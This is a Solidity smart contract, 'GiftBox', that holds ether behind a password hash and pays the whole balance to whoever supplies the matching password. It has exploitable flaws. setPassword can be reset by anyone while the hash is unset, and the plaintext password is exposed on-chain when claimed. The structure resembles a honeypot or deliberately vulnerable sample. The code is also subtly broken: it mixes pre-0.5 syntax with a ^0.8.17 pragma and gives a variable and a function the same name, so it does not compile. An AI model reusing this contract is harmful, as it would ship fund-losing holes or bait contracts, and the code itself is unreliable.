pragma solidity ^0.8.17;

contract GiftBox {
    string private message;
    bool public passHasBeenSet = false;
    address public sender;
    bytes32 public passwordHash;

    function() public payable{}

    function setPassword(bytes32 newPassword) external payable {
        if ((!passHasBeenSet && (msg.value > 1 ether)) || passwordHash == 0x0) {
            passwordHash = getHash(newPassword);
            sender = msg.sender;
        }
    }

    function setMessage(string _message) external {
        if (msg.sender == sender) {
            message = _message;
        }
    }

    function getGift(bytes password) external payable returns (string) {
        if (passwordHash == getHash(password)) {
            msg.sender.transfer(this.balance);
            return message;
        }
    }

    function revoke() external payable {
        if (msg.sender == sender) {
            message = "";
            sender.transfer(this.balance);
        }
    }

    function getHash(bytes password) internal constant returns (bytes32) {
        return keccak256(password);
    }

    function passHasBeenSet(bytes32 currentPasswordHash) external {
        if (msg.sender == sender && currentPasswordHash == passwordHash) {
           passHasBeenSet = true;
        }
    }
}
